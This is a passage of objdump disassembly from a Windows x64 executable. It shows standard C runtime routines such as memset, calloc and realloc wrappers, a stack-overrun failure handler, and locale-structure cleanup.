   14000583b:	81 ff 00 01 00 00    	cmp    $0x100,%edi
   140005841:	7d 16                	jge    0x140005859
   140005843:	48 63 cf             	movslq %edi,%rcx
   140005846:	8a 84 19 1d 01 00 00 	mov    0x11d(%rcx,%rbx,1),%al
   14000584d:	42 88 84 01 f0 bb 00 	mov    %al,0xbbf0(%rcx,%r8,1)
   140005854:	00 
   140005855:	ff c7                	inc    %edi
   140005857:	eb de                	jmp    0x140005837
   140005859:	48 8b 05 90 64 00 00 	mov    0x6490(%rip),%rax        # 0x14000bcf0
   140005860:	f0 ff 08             	lock decl (%rax)
   140005863:	75 11                	jne    0x140005876
   140005865:	48 8b 0d 84 64 00 00 	mov    0x6484(%rip),%rcx        # 0x14000bcf0
   14000586c:	49 3b cc             	cmp    %r12,%rcx
   14000586f:	74 05                	je     0x140005876
   140005871:	e8 76 c5 ff ff       	call   0x140001dec
   140005876:	48 89 1d 73 64 00 00 	mov    %rbx,0x6473(%rip)        # 0x14000bcf0
   14000587d:	f0 ff 03             	lock incl (%rbx)
   140005880:	8b ce                	mov    %esi,%ecx
   140005882:	e8 cd e2 ff ff       	call   0x140003b54
   140005887:	eb 2b                	jmp    0x1400058b4
   140005889:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000588c:	75 26                	jne    0x1400058b4
   14000588e:	4c 8d 25 2b 60 00 00 	lea    0x602b(%rip),%r12        # 0x14000b8c0
   140005895:	49 3b dc             	cmp    %r12,%rbx
   140005898:	74 08                	je     0x1400058a2
   14000589a:	48 8b cb             	mov    %rbx,%rcx
   14000589d:	e8 4a c5 ff ff       	call   0x140001dec
   1400058a2:	e8 35 c8 ff ff       	call   0x1400020dc
   1400058a7:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400058ad:	eb 05                	jmp    0x1400058b4
   1400058af:	33 ff                	xor    %edi,%edi
   1400058b1:	44 8b ef             	mov    %edi,%r13d
   1400058b4:	41 8b c5             	mov    %r13d,%eax
   1400058b7:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400058bc:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400058c1:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400058c6:	4c 8b 64 24 58       	mov    0x58(%rsp),%r12
   1400058cb:	48 83 c4 30          	add    $0x30,%rsp
   1400058cf:	41 5d                	pop    %r13
   1400058d1:	c3                   	ret
   1400058d2:	cc                   	int3
   1400058d3:	cc                   	int3
   1400058d4:	48 83 ec 28          	sub    $0x28,%rsp
   1400058d8:	83 3d e1 7a 00 00 00 	cmpl   $0x0,0x7ae1(%rip)        # 0x14000d3c0
   1400058df:	75 14                	jne    0x1400058f5
   1400058e1:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   1400058e6:	e8 09 fe ff ff       	call   0x1400056f4
   1400058eb:	c7 05 cb 7a 00 00 01 	movl   $0x1,0x7acb(%rip)        # 0x14000d3c0
   1400058f2:	00 00 00 
   1400058f5:	33 c0                	xor    %eax,%eax
   1400058f7:	48 83 c4 28          	add    $0x28,%rsp
   1400058fb:	c3                   	ret
   1400058fc:	83 25 7d 78 00 00 00 	andl   $0x0,0x787d(%rip)        # 0x14000d180
   140005903:	c3                   	ret
   140005904:	cc                   	int3
   140005905:	cc                   	int3
   140005906:	cc                   	int3
   140005907:	cc                   	int3
   140005908:	cc                   	int3
   140005909:	cc                   	int3
   14000590a:	cc                   	int3
   14000590b:	cc                   	int3
   14000590c:	cc                   	int3
   14000590d:	cc                   	int3
   14000590e:	cc                   	int3
   14000590f:	cc                   	int3
   140005910:	cc                   	int3
   140005911:	cc                   	int3
   140005912:	cc                   	int3
   140005913:	cc                   	int3
   140005914:	cc                   	int3
   140005915:	cc                   	int3
   140005916:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000591d:	00 00 00 
   140005920:	48 8b c1             	mov    %rcx,%rax
   140005923:	49 83 f8 08          	cmp    $0x8,%r8
   140005927:	72 53                	jb     0x14000597c
   140005929:	0f b6 d2             	movzbl %dl,%edx
   14000592c:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   140005933:	01 01 01 
   140005936:	49 0f af d1          	imul   %r9,%rdx
   14000593a:	49 83 f8 40          	cmp    $0x40,%r8
   14000593e:	72 1e                	jb     0x14000595e
   140005940:	48 f7 d9             	neg    %rcx
   140005943:	83 e1 07             	and    $0x7,%ecx
   140005946:	74 06                	je     0x14000594e
   140005948:	4c 2b c1             	sub    %rcx,%r8
   14000594b:	48 89 10             	mov    %rdx,(%rax)
   14000594e:	48 03 c8             	add    %rax,%rcx
   140005951:	4d 8b c8             	mov    %r8,%r9
   140005954:	49 83 e0 3f          	and    $0x3f,%r8
   140005958:	49 c1 e9 06          	shr    $0x6,%r9
   14000595c:	75 39                	jne    0x140005997
   14000595e:	4d 8b c8             	mov    %r8,%r9
   140005961:	49 83 e0 07          	and    $0x7,%r8
   140005965:	49 c1 e9 03          	shr    $0x3,%r9
   140005969:	74 11                	je     0x14000597c
   14000596b:	66 66 66 90          	data16 data16 xchg %ax,%ax
   14000596f:	90                   	nop
   140005970:	48 89 11             	mov    %rdx,(%rcx)
   140005973:	48 83 c1 08          	add    $0x8,%rcx
   140005977:	49 ff c9             	dec    %r9
   14000597a:	75 f4                	jne    0x140005970
   14000597c:	4d 85 c0             	test   %r8,%r8
   14000597f:	74 0a                	je     0x14000598b
   140005981:	88 11                	mov    %dl,(%rcx)
   140005983:	48 ff c1             	inc    %rcx
   140005986:	49 ff c8             	dec    %r8
   140005989:	75 f6                	jne    0x140005981
   14000598b:	c3                   	ret
   14000598c:	0f 1f 40 00          	nopl   0x0(%rax)
   140005990:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140005994:	66 66 90             	data16 xchg %ax,%ax
   140005997:	49 81 f9 00 1c 00 00 	cmp    $0x1c00,%r9
   14000599e:	73 30                	jae    0x1400059d0
   1400059a0:	48 89 11             	mov    %rdx,(%rcx)
   1400059a3:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   1400059a7:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   1400059ab:	48 83 c1 40          	add    $0x40,%rcx
   1400059af:	48 89 51 d8          	mov    %rdx,-0x28(%rcx)
   1400059b3:	48 89 51 e0          	mov    %rdx,-0x20(%rcx)
   1400059b7:	49 ff c9             	dec    %r9
   1400059ba:	48 89 51 e8          	mov    %rdx,-0x18(%rcx)
   1400059be:	48 89 51 f0          	mov    %rdx,-0x10(%rcx)
   1400059c2:	48 89 51 f8          	mov    %rdx,-0x8(%rcx)
   1400059c6:	75 d8                	jne    0x1400059a0
   1400059c8:	eb 94                	jmp    0x14000595e
   1400059ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400059d0:	48 0f c3 11          	movnti %rdx,(%rcx)
   1400059d4:	48 0f c3 51 08       	movnti %rdx,0x8(%rcx)
   1400059d9:	48 0f c3 51 10       	movnti %rdx,0x10(%rcx)
   1400059de:	48 83 c1 40          	add    $0x40,%rcx
   1400059e2:	48 0f c3 51 d8       	movnti %rdx,-0x28(%rcx)
   1400059e7:	48 0f c3 51 e0       	movnti %rdx,-0x20(%rcx)
   1400059ec:	49 ff c9             	dec    %r9
   1400059ef:	48 0f c3 51 e8       	movnti %rdx,-0x18(%rcx)
   1400059f4:	48 0f c3 51 f0       	movnti %rdx,-0x10(%rcx)
   1400059f9:	48 0f c3 51 f8       	movnti %rdx,-0x8(%rcx)
   1400059fe:	75 d0                	jne    0x1400059d0
   140005a00:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   140005a05:	e9 54 ff ff ff       	jmp    0x14000595e
   140005a0a:	cc                   	int3
   140005a0b:	cc                   	int3
   140005a0c:	48 83 ec 28          	sub    $0x28,%rsp
   140005a10:	e8 e7 e2 ff ff       	call   0x140003cfc
   140005a15:	48 85 c0             	test   %rax,%rax
   140005a18:	74 0a                	je     0x140005a24
   140005a1a:	b9 16 00 00 00       	mov    $0x16,%ecx
   140005a1f:	e8 e8 e2 ff ff       	call   0x140003d0c
   140005a24:	f6 05 c5 63 00 00 02 	testb  $0x2,0x63c5(%rip)        # 0x14000bdf0
   140005a2b:	74 14                	je     0x140005a41
   140005a2d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005a33:	ba 15 00 00 40       	mov    $0x40000015,%edx
   140005a38:	41 8d 48 02          	lea    0x2(%r8),%ecx
   140005a3c:	e8 f7 dd ff ff       	call   0x140003838
   140005a41:	b9 03 00 00 00       	mov    $0x3,%ecx
   140005a46:	e8 75 ca ff ff       	call   0x1400024c0
   140005a4b:	cc                   	int3
   140005a4c:	48 83 ec 28          	sub    $0x28,%rsp
   140005a50:	48 85 c9             	test   %rcx,%rcx
   140005a53:	75 19                	jne    0x140005a6e
   140005a55:	e8 82 c6 ff ff       	call   0x1400020dc
   140005a5a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005a60:	e8 c3 df ff ff       	call   0x140003a28
   140005a65:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140005a69:	48 83 c4 28          	add    $0x28,%rsp
   140005a6d:	c3                   	ret
   140005a6e:	4c 8b c1             	mov    %rcx,%r8
   140005a71:	48 8b 0d f8 65 00 00 	mov    0x65f8(%rip),%rcx        # 0x14000c070
   140005a78:	33 d2                	xor    %edx,%edx
   140005a7a:	48 83 c4 28          	add    $0x28,%rsp
   140005a7e:	48 ff 25 23 26 00 00 	rex.W jmp *0x2623(%rip)        # 0x1400080a8
   140005a85:	cc                   	int3
   140005a86:	cc                   	int3
   140005a87:	cc                   	int3
   140005a88:	b9 02 00 00 00       	mov    $0x2,%ecx
   140005a8d:	e9 5a ca ff ff       	jmp    0x1400024ec
   140005a92:	cc                   	int3
   140005a93:	cc                   	int3
   140005a94:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140005a99:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140005aa0:	48 8d 0d e9 71 00 00 	lea    0x71e9(%rip),%rcx        # 0x14000cc90
   140005aa7:	ff 15 4b 28 00 00    	call   *0x284b(%rip)        # 0x1400082f8
   140005aad:	48 8b 05 d4 72 00 00 	mov    0x72d4(%rip),%rax        # 0x14000cd88
   140005ab4:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140005ab9:	45 33 c0             	xor    %r8d,%r8d
   140005abc:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140005ac1:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140005ac6:	e8 9f 0d 00 00       	call   0x14000686a
   140005acb:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140005ad0:	48 83 7c 24 50 00    	cmpq   $0x0,0x50(%rsp)
   140005ad6:	74 41                	je     0x140005b19
   140005ad8:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140005adf:	00 00 
   140005ae1:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140005ae6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005aeb:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140005af0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005af5:	48 8d 05 94 71 00 00 	lea    0x7194(%rip),%rax        # 0x14000cc90
   140005afc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005b01:	4c 8b 4c 24 50       	mov    0x50(%rsp),%r9
   140005b06:	4c 8b 44 24 58       	mov    0x58(%rsp),%r8
   140005b0b:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140005b10:	33 c9                	xor    %ecx,%ecx
   140005b12:	e8 4d 0d 00 00       	call   0x140006864
   140005b17:	eb 22                	jmp    0x140005b3b
   140005b19:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140005b20:	00 
   140005b21:	48 89 05 60 72 00 00 	mov    %rax,0x7260(%rip)        # 0x14000cd88
   140005b28:	48 8d 84 24 88 00 00 	lea    0x88(%rsp),%rax
   140005b2f:	00 
   140005b30:	48 83 c0 08          	add    $0x8,%rax
   140005b34:	48 89 05 ed 71 00 00 	mov    %rax,0x71ed(%rip)        # 0x14000cd28
   140005b3b:	48 8b 05 46 72 00 00 	mov    0x7246(%rip),%rax        # 0x14000cd88
   140005b42:	48 89 05 b7 70 00 00 	mov    %rax,0x70b7(%rip)        # 0x14000cc00
   140005b49:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   140005b50:	00 
   140005b51:	48 89 05 b8 71 00 00 	mov    %rax,0x71b8(%rip)        # 0x14000cd10
   140005b58:	c7 05 8e 70 00 00 09 	movl   $0xc0000409,0x708e(%rip)        # 0x14000cbf0
   140005b5f:	04 00 c0 
   140005b62:	c7 05 88 70 00 00 01 	movl   $0x1,0x7088(%rip)        # 0x14000cbf4
   140005b69:	00 00 00 
   140005b6c:	48 8b 05 fd 58 00 00 	mov    0x58fd(%rip),%rax        # 0x14000b470
   140005b73:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140005b78:	48 8b 05 f9 58 00 00 	mov    0x58f9(%rip),%rax        # 0x14000b478
   140005b7f:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140005b84:	ff 15 8e 26 00 00    	call   *0x268e(%rip)        # 0x140008218
   140005b8a:	89 05 f8 70 00 00    	mov    %eax,0x70f8(%rip)        # 0x14000cc88
   140005b90:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005b95:	e8 62 fd ff ff       	call   0x1400058fc
   140005b9a:	33 c9                	xor    %ecx,%ecx
   140005b9c:	ff 15 e6 25 00 00    	call   *0x25e6(%rip)        # 0x140008188
   140005ba2:	48 8d 0d 77 38 00 00 	lea    0x3877(%rip),%rcx        # 0x140009420
   140005ba9:	ff 15 61 26 00 00    	call   *0x2661(%rip)        # 0x140008210
   140005baf:	83 3d d2 70 00 00 00 	cmpl   $0x0,0x70d2(%rip)        # 0x14000cc88
   140005bb6:	75 0a                	jne    0x140005bc2
   140005bb8:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005bbd:	e8 3a fd ff ff       	call   0x1400058fc
   140005bc2:	ff 15 60 26 00 00    	call   *0x2660(%rip)        # 0x140008228
   140005bc8:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140005bcd:	48 8b c8             	mov    %rax,%rcx
   140005bd0:	ff 15 4a 26 00 00    	call   *0x264a(%rip)        # 0x140008220
   140005bd6:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140005bdd:	c3                   	ret
   140005bde:	cc                   	int3
   140005bdf:	cc                   	int3
   140005be0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005be5:	57                   	push   %rdi
   140005be6:	48 83 ec 20          	sub    $0x20,%rsp
   140005bea:	49 8b d8             	mov    %r8,%rbx
   140005bed:	48 8b fa             	mov    %rdx,%rdi
   140005bf0:	48 85 c9             	test   %rcx,%rcx
   140005bf3:	74 1d                	je     0x140005c12
   140005bf5:	33 d2                	xor    %edx,%edx
   140005bf7:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140005bfb:	48 f7 f1             	div    %rcx
   140005bfe:	48 3b c7             	cmp    %rdi,%rax
   140005c01:	73 0f                	jae    0x140005c12
   140005c03:	e8 d4 c4 ff ff       	call   0x1400020dc
   140005c08:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140005c0e:	33 c0                	xor    %eax,%eax
   140005c10:	eb 5d                	jmp    0x140005c6f
   140005c12:	48 0f af f9          	imul   %rcx,%rdi
   140005c16:	b8 01 00 00 00       	mov    $0x1,%eax
   140005c1b:	48 85 ff             	test   %rdi,%rdi
   140005c1e:	48 0f 44 f8          	cmove  %rax,%rdi
   140005c22:	33 c0                	xor    %eax,%eax
   140005c24:	48 83 ff e0          	cmp    $0xffffffffffffffe0,%rdi
   140005c28:	77 18                	ja     0x140005c42
   140005c2a:	48 8b 0d 3f 64 00 00 	mov    0x643f(%rip),%rcx        # 0x14000c070
   140005c31:	8d 50 08             	lea    0x8(%rax),%edx
   140005c34:	4c 8b c7             	mov    %rdi,%r8
   140005c37:	ff 15 f3 24 00 00    	call   *0x24f3(%rip)        # 0x140008130
   140005c3d:	48 85 c0             	test   %rax,%rax
   140005c40:	75 2d                	jne    0x140005c6f
   140005c42:	83 3d b7 6a 00 00 00 	cmpl   $0x0,0x6ab7(%rip)        # 0x14000c700
   140005c49:	74 19                	je     0x140005c64
   140005c4b:	48 8b cf             	mov    %rdi,%rcx
   140005c4e:	e8 99 cb ff ff       	call   0x1400027ec
   140005c53:	85 c0                	test   %eax,%eax
   140005c55:	75 cb                	jne    0x140005c22
   140005c57:	48 85 db             	test   %rbx,%rbx
   140005c5a:	74 b2                	je     0x140005c0e
   140005c5c:	c7 03 0c 00 00 00    	movl   $0xc,(%rbx)
   140005c62:	eb aa                	jmp    0x140005c0e
   140005c64:	48 85 db             	test   %rbx,%rbx
   140005c67:	74 06                	je     0x140005c6f
   140005c69:	c7 03 0c 00 00 00    	movl   $0xc,(%rbx)
   140005c6f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005c74:	48 83 c4 20          	add    $0x20,%rsp
   140005c78:	5f                   	pop    %rdi
   140005c79:	c3                   	ret
   140005c7a:	cc                   	int3
   140005c7b:	cc                   	int3
   140005c7c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005c81:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005c86:	57                   	push   %rdi
   140005c87:	48 83 ec 20          	sub    $0x20,%rsp
   140005c8b:	48 8b da             	mov    %rdx,%rbx
   140005c8e:	48 8b f9             	mov    %rcx,%rdi
   140005c91:	48 85 c9             	test   %rcx,%rcx
   140005c94:	75 0a                	jne    0x140005ca0
   140005c96:	48 8b ca             	mov    %rdx,%rcx
   140005c99:	e8 8e c1 ff ff       	call   0x140001e2c
   140005c9e:	eb 6a                	jmp    0x140005d0a
   140005ca0:	48 85 d2             	test   %rdx,%rdx
   140005ca3:	75 07                	jne    0x140005cac
   140005ca5:	e8 42 c1 ff ff       	call   0x140001dec
   140005caa:	eb 5c                	jmp    0x140005d08
   140005cac:	48 83 fa e0          	cmp    $0xffffffffffffffe0,%rdx
   140005cb0:	77 43                	ja     0x140005cf5
   140005cb2:	48 8b 0d b7 63 00 00 	mov    0x63b7(%rip),%rcx        # 0x14000c070
   140005cb9:	b8 01 00 00 00       	mov    $0x1,%eax
   140005cbe:	48 85 db             	test   %rbx,%rbx
   140005cc1:	48 0f 44 d8          	cmove  %rax,%rbx
   140005cc5:	4c 8b c7             	mov    %rdi,%r8
   140005cc8:	33 d2                	xor    %edx,%edx
   140005cca:	4c 8b cb             	mov    %rbx,%r9
   140005ccd:	ff 15 cd 23 00 00    	call   *0x23cd(%rip)        # 0x1400080a0
   140005cd3:	48 8b f0             	mov    %rax,%rsi
   140005cd6:	48 85 c0             	test   %rax,%rax
   140005cd9:	75 6f                	jne    0x140005d4a
   140005cdb:	39 05 1f 6a 00 00    	cmp    %eax,0x6a1f(%rip)        # 0x14000c700
   140005ce1:	74 50                	je     0x140005d33
   140005ce3:	48 8b cb             	mov    %rbx,%rcx
   140005ce6:	e8 01 cb ff ff       	call   0x1400027ec
   140005ceb:	85 c0                	test   %eax,%eax
   140005ced:	74 2b                	je     0x140005d1a
   140005cef:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   140005cf3:	76 bd                	jbe    0x140005cb2
   140005cf5:	48 8b cb             	mov    %rbx,%rcx
   140005cf8:	e8 ef ca ff ff       	call   0x1400027ec
   140005cfd:	e8 da c3 ff ff       	call   0x1400020dc
   140005d02:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140005d08:	33 c0                	xor    %eax,%eax
   140005d0a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005d0f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005d14:	48 83 c4 20          	add    $0x20,%rsp
   140005d18:	5f                   	pop    %rdi
   140005d19:	c3                   	ret
   140005d1a:	e8 bd c3 ff ff       	call   0x1400020dc
   140005d1f:	48 8b d8             	mov    %rax,%rbx
   140005d22:	ff 15 f8 23 00 00    	call   *0x23f8(%rip)        # 0x140008120
   140005d28:	8b c8                	mov    %eax,%ecx
   140005d2a:	e8 65 c3 ff ff       	call   0x140002094
   140005d2f:	89 03                	mov    %eax,(%rbx)
   140005d31:	eb d5                	jmp    0x140005d08
   140005d33:	e8 a4 c3 ff ff       	call   0x1400020dc
   140005d38:	48 8b d8             	mov    %rax,%rbx
   140005d3b:	ff 15 df 23 00 00    	call   *0x23df(%rip)        # 0x140008120
   140005d41:	8b c8                	mov    %eax,%ecx
   140005d43:	e8 4c c3 ff ff       	call   0x140002094
   140005d48:	89 03                	mov    %eax,(%rbx)
   140005d4a:	48 8b c6             	mov    %rsi,%rax
   140005d4d:	eb bb                	jmp    0x140005d0a
   140005d4f:	cc                   	int3
   140005d50:	48 85 c9             	test   %rcx,%rcx
   140005d53:	0f 84 e4 03 00 00    	je     0x14000613d
   140005d59:	53                   	push   %rbx
   140005d5a:	48 83 ec 20          	sub    $0x20,%rsp
   140005d5e:	48 8b d9             	mov    %rcx,%rbx
   140005d61:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140005d65:	e8 82 c0 ff ff       	call   0x140001dec
   140005d6a:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140005d6e:	e8 79 c0 ff ff       	call   0x140001dec
   140005d73:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140005d77:	e8 70 c0 ff ff       	call   0x140001dec
   140005d7c:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140005d80:	e8 67 c0 ff ff       	call   0x140001dec
   140005d85:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140005d89:	e8 5e c0 ff ff       	call   0x140001dec
   140005d8e:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140005d92:	e8 55 c0 ff ff       	call   0x140001dec
   140005d97:	48 8b 0b             	mov    (%rbx),%rcx
   140005d9a:	e8 4d c0 ff ff       	call   0x140001dec
   140005d9f:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   140005da3:	e8 44 c0 ff ff       	call   0x140001dec
   140005da8:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140005dac:	e8 3b c0 ff ff       	call   0x140001dec
   140005db1:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   140005db5:	e8 32 c0 ff ff       	call   0x140001dec
   140005dba:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   140005dbe:	e8 29 c0 ff ff       	call   0x140001dec
   140005dc3:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   140005dc7:	e8 20 c0 ff ff       	call   0x140001dec
   140005dcc:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140005dd0:	e8 17 c0 ff ff       	call   0x140001dec
   140005dd5:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140005dd9:	e8 0e c0 ff ff       	call   0x140001dec
   140005dde:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140005de2:	e8 05 c0 ff ff       	call   0x140001dec
   140005de7:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140005deb:	e8 fc bf ff ff       	call   0x140001dec
   140005df0:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140005df7:	e8 f0 bf ff ff       	call   0x140001dec
   140005dfc:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140005e03:	e8 e4 bf ff ff       	call   0x140001dec
   140005e08:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   140005e0f:	e8 d8 bf ff ff       	call   0x140001dec
   140005e14:	48 8b 8b 98 00 00 00 	mov    0x98(%rbx),%rcx
   140005e1b:	e8 cc bf ff ff       	call   0x140001dec
   140005e20:	48 8b 8b a0 00 00 00 	mov    0xa0(%rbx),%rcx
   140005e27:	e8 c0 bf ff ff       	call   0x140001dec
   140005e2c:	48 8b 8b a8 00 00 00 	mov    0xa8(%rbx),%rcx
   140005e33:	e8 b4 bf ff ff       	call   0x140001dec
   140005e38:	48 8b 8b b0 00 00 00 	mov    0xb0(%rbx),%rcx
   140005e3f:	e8 a8 bf ff ff       	call   0x140001dec
   140005e44:	48 8b 8b b8 00 00 00 	mov    0xb8(%rbx),%rcx
   140005e4b:	e8 9c bf ff ff       	call   0x140001dec
   140005e50:	48 8b 8b c0 00 00 00 	mov    0xc0(%rbx),%rcx
   140005e57:	e8 90 bf ff ff       	call   0x140001dec
   140005e5c:	48 8b 8b c8 00 00 00 	mov    0xc8(%rbx),%rcx
   140005e63:	e8 84 bf ff ff       	call   0x140001dec
   140005e68:	48 8b 8b d0 00 00 00 	mov    0xd0(%rbx),%rcx
   140005e6f:	e8 78 bf ff ff       	call   0x140001dec
   140005e74:	48 8b 8b d8 00 00 00 	mov    0xd8(%rbx),%rcx
   140005e7b:	e8 6c bf ff ff       	call   0x140001dec
   140005e80:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   140005e87:	e8 60 bf ff ff       	call   0x140001dec
   140005e8c:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   140005e93:	e8 54 bf ff ff       	call   0x140001dec
   140005e98:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   140005e9f:	e8 48 bf ff ff       	call   0x140001dec
   140005ea4:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140005eab:	e8 3c bf ff ff       	call   0x140001dec
   140005eb0:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   140005eb7:	e8 30 bf ff ff       	call   0x140001dec
   140005ebc:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   140005ec3:	e8 24 bf ff ff       	call   0x140001dec
   140005ec8:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   140005ecf:	e8 18 bf ff ff       	call   0x140001dec
   140005ed4:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   140005edb:	e8 0c bf ff ff       	call   0x140001dec
   140005ee0:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   140005ee7:	e8 00 bf ff ff       	call   0x140001dec
   140005eec:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   140005ef3:	e8 f4 be ff ff       	call   0x140001dec
   140005ef8:	48 8b 8b 30 01 00 00 	mov    0x130(%rbx),%rcx
   140005eff:	e8 e8 be ff ff       	call   0x140001dec
   140005f04:	48 8b 8b 38 01 00 00 	mov    0x138(%rbx),%rcx
   140005f0b:	e8 dc be ff ff       	call   0x140001dec
   140005f10:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   140005f17:	e8 d0 be ff ff       	call   0x140001dec
   140005f1c:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   140005f23:	e8 c4 be ff ff       	call   0x140001dec
   140005f28:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   140005f2f:	e8 b8 be ff ff       	call   0x140001dec
   140005f34:	48 8b 8b 70 01 00 00 	mov    0x170(%rbx),%rcx
   140005f3b:	e8 ac be ff ff       	call   0x140001dec
   140005f40:	48 8b 8b 78 01 00 00 	mov    0x178(%rbx),%rcx
   140005f47:	e8 a0 be ff ff       	call   0x140001dec
   140005f4c:	48 8b 8b 80 01 00 00 	mov    0x180(%rbx),%rcx
   140005f53:	e8 94 be ff ff       	call   0x140001dec
   140005f58:	48 8b 8b 88 01 00 00 	mov    0x188(%rbx),%rcx
   140005f5f:	e8 88 be ff ff       	call   0x140001dec
   140005f64:	48 8b 8b 90 01 00 00 	mov    0x190(%rbx),%rcx
   140005f6b:	e8 7c be ff ff       	call   0x140001dec
   140005f70:	48 8b 8b 98 01 00 00 	mov    0x198(%rbx),%rcx
   140005f77:	e8 70 be ff ff       	call   0x140001dec
   140005f7c:	48 8b 8b 68 01 00 00 	mov    0x168(%rbx),%rcx
   140005f83:	e8 64 be ff ff       	call   0x140001dec
   140005f88:	48 8b 8b a8 01 00 00 	mov    0x1a8(%rbx),%rcx
   140005f8f:	e8 58 be ff ff       	call   0x140001dec
   140005f94:	48 8b 8b b0 01 00 00 	mov    0x1b0(%rbx),%rcx
   140005f9b:	e8 4c be ff ff       	call   0x140001dec
   140005fa0:	48 8b 8b b8 01 00 00 	mov    0x1b8(%rbx),%rcx
   140005fa7:	e8 40 be ff ff       	call   0x140001dec
   140005fac:	48 8b 8b c0 01 00 00 	mov    0x1c0(%rbx),%rcx
   140005fb3:	e8 34 be ff ff       	call   0x140001dec
   140005fb8:	48 8b 8b c8 01 00 00 	mov    0x1c8(%rbx),%rcx
   140005fbf:	e8 28 be ff ff       	call   0x140001dec
   140005fc4:	48 8b 8b d0 01 00 00 	mov    0x1d0(%rbx),%rcx
   140005fcb:	e8 1c be ff ff       	call   0x140001dec
   140005fd0:	48 8b 8b a0 01 00 00 	mov    0x1a0(%rbx),%rcx
   140005fd7:	e8 10 be ff ff       	call   0x140001dec
   140005fdc:	48 8b 8b d8 01 00 00 	mov    0x1d8(%rbx),%rcx
   140005fe3:	e8 04 be ff ff       	call   0x140001dec
   140005fe8:	48 8b 8b e0 01 00 00 	mov    0x1e0(%rbx),%rcx
   140005fef:	e8 f8 bd ff ff       	call   0x140001dec
   140005ff4:	48 8b 8b e8 01 00 00 	mov    0x1e8(%rbx),%rcx
   140005ffb:	e8 ec bd ff ff       	call   0x140001dec
   140006000:	48 8b 8b f0 01 00 00 	mov    0x1f0(%rbx),%rcx
   140006007:	e8 e0 bd ff ff       	call   0x140001dec
   14000600c:	48 8b 8b f8 01 00 00 	mov    0x1f8(%rbx),%rcx
